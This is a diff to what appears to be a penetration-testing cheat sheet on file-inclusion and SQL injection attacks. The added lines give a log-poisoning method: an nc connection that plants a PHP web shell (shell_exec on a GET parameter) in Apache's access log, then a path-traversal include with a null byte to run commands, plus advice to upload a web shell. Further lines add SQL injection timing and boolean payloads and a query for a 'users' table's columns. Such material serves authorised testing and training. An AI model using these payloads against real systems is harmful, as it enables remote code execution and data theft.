@@ -100,6 +100,7 @@ index.php
 **Auto-Extension (.php) Bypass (PHP version < 5.3):**
 * NULL "%00"
 
+
 >**Shell from RFI and LFI**
 
 **RFI Shell 1:**
@@ -121,6 +122,19 @@ exploit
 5. Navigate to shell (http://www.victim.com/index.php?page=http://127.0.0.1:4321/shellcommand.txt)
 
 **LFI Shell:**
+
+{% highlight bash %}
+#From logs
+nc -nv 192.168.1.2 80
+<?php echo shell_exec($_GET['cmd']);?>
+Navigate to http://192.168.1.2/cmd=ipconfig&LANG=../../../../../../../../xampp/apache/logs/access_log%00
+
+#Look for file uploads and determin directory
+#Attempt to upload a web shell
+Navigate to that location using LFI.
+
+{% endhighlight %}
+
 * [LFI Shell 1](http://resources.infosecinstitute.com/local-file-inclusion-code-execution/)
 * [LFI Shell 2](https://highon.coffee/blog/lfi-cheat-sheet/)
 
@@ -144,7 +158,10 @@ Commenting out the end | <code> Dent' ;# <br> Dent' ;-- </code>
 Inline Commenting | <code> De'/* */'nt </code>
 Concatenation | <code> De''nt <br> De'||'nt </code>
 Binary/Boolean | <code> Dent' and 1;# <br> Dent' and 1=1;# <br> Dent' and 0;# <br> Dent' and 1=0;# </code>
-Sleep | <code> Sleeep(10) MySQL <br>  WAITFOR DELAY '0:0:10'  MSSQL
+Sleep 1 | <code> Sleep(10) MySQL <br>  WAITFOR DELAY '0:0:10'  MSSQL </code> 
+Sleep 2 | <code> id=1-sleep(10)  </code>
+Math | <code> id=1-0 </code>
+
 
 Determine the level of blindness:
 {% highlight sql %}
@@ -176,7 +193,7 @@ PostgreSQL | 5-digit Hex Error Code
 
 Database | schema_name FROM information_schema.schemata 
 Table | table_name FROM information_schema.tables
-Columns | column_name From information_schema.columns
+Columns | column_name From information_schema.columns where table_name='users'
 
 **SQL Server:**
 
